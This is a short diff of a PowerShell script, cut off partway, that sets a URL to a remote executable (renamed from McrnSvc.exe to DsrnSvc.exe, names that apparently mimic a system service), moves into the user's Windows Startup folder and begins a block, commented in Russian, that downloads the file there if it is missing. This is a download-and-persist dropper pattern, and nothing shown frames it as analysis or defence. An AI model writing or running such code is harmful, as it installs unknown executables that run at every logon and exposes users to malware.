@@ -1,7 +1,7 @@
-$url = "https://raw.githubusercontent.com/xzj4/1/refs/heads/main/McrnSvc.exe"
+$url = "https://raw.githubusercontent.com/xzj4/1/refs/heads/main/DsrnSvc.exe"
 #$destPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\wcrnsvc.exe"
 cd "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
-$destPath = ".\McrnSvc.exe"
+$destPath = ".\DsrnSvc.exe"
 # 1. Блок скачивания файла
 try {
     if (-not (Test-Path $destPath)) {
